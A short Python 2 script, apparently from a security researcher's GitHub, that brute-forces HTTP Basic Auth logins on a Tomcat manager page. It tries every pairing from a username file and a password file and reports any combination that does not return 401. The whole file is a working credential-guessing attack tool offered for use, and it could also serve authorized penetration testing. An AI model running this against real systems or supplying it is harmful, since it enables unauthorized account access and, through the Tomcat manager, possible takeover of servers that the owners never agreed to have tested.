#python
#coding:utf-8
#authore:bit4
#github:https://github.com/bit4woo

import requests
import sys
from requests.auth import HTTPBasicAuth


def judge_web(self):
    try:
        res=requests.get(self)
    except requests.RequestException as e:
        print "url error"
        exit()

def judge_file(self):
    try:
        open(self,'r')
    except IOError as e:
        print "can not find file" 
        exit()


def main():
    usage = "Usage: python {0} usernamefile passwordfile http://www.xxx.com/manager/html".format(sys.argv[0],)
    proxy = { "http": "http://127.0.0.1:8080", }

    if len(sys.argv) != 4:
        print "incorrect number of arguments"
        print usage

    judge_file(sys.argv[1])
    judge_file(sys.argv[2])
    judge_web(sys.argv[3])

    for i in open(sys.argv[1], 'r').readlines():
        for j in open(sys.argv[2], 'r').readlines():
            try:
                #res = requests.get(sys.argv[3], auth=HTTPBasicAuth(i.split()[0], j.split()[0]), proxies=proxy) #use proxy to view request detail --debug
                res = requests.get(sys.argv[3], auth=HTTPBasicAuth(i.split()[0], j.split()[0]))
                if(res.status_code == 401):
                    print "Failed {0}:{1}".format(i.split()[0],j.split()[0])
                else:
                    print "successed {0}:{1}".format(i.split()[0],j.split()[0])
            except requests.RequestException as e:
                print e
if __name__ == '__main__':
    main()